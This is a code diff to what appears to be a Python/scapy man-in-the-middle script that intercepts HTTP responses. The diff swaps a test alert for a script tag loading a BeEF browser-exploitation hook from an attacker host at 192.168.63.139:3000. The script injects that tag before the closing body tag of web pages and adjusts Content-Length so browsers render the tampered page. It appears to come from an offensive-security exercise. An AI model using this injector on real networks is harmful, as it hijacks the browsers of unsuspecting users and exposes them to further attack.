@@ -10,6 +10,7 @@ replace_load = ""
 # Content-Length non capturing group, return value, but not the key for the value.
 ContentLengthRegex = "(?:Content-Length:\s)(\d*)"
 injection_code = "<script>alert('Test!'); </script>"
+beef_injection_code = '<script src="http://192.168.63.139:3000/hook.js"></script>'
 
 # Take our modified load and set it to the packet load
 def set_load(packet, load):
@@ -42,13 +43,13 @@ def process_packet(packet):
             elif scapy_packet.haslayer(TCP) and scapy_packet[TCP].sport == 80:
                 print("[+] HTTP Response Intercepted:  ")
                 # method replace string with another string
-                load = load.replace("</body>", injection_code + "</body>")
+                load = load.replace("</body>", beef_injection_code + "</body>")
                 # Update Content-Length so the browser doesn't cut off the end of the page
                 content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
                 # if value, and, check this is a html response, not an image etc
                 if content_length_search and "text/html" in load:
                     content_length = content_length_search.group(1)
-                    new_content_length = int(content_length) + len(injection_code)
+                    new_content_length = int(content_length) + len(beef_injection_code)
                     load = load.replace(content_length, str(new_content_length))
 
                 # 3. APPLY CHANGES
